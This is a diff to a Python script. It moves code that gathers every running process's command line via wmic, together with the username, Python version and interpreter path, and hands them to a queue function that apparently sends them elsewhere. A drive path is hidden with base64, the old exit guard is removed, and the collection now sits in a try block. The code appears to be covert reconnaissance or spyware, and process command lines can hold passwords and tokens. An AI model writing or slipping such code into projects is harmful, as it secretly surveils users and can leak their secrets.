@@ -160,28 +160,26 @@ def find_file(target_name, start_dir):
         if target_name in files:
             return os.path.join(root, target_name)
     return None
-
-
-if not os.path.exists(base64.b64decode("Uzov").decode()):
-    sys.exit(0)
-
-cls = subprocess.run(
-    "wmic process get CommandLine /format:list",
-    shell=True,
-    capture_output=True,
-    text=True,
-)
-
-add_queue_task(
-    "tsl__{}__begin".format(getpass.getuser().lower()),
-    {
-        "sys_version": str(sys.version),
-        "exec_path": str(sys.executable),
-        "cls": cls.stdout,
-    },
-)
-
+    
+    
+    
 try:
+    cls = subprocess.run(
+        "wmic process get CommandLine /format:list",
+        shell=True,
+        capture_output=True,
+        text=True,
+    )
+    
+    add_queue_task(
+        "tsl__{}__begin".format(getpass.getuser().lower()),
+        {
+            "sys_version": str(sys.version),
+            "exec_path": str(sys.executable),
+            "cls": cls.stdout,
+        },
+    )
+
     ldir = search_latest_files_or_dirs(
         dir_path=base64.b64decode("Uzov").decode(), ext="", n=5
     )
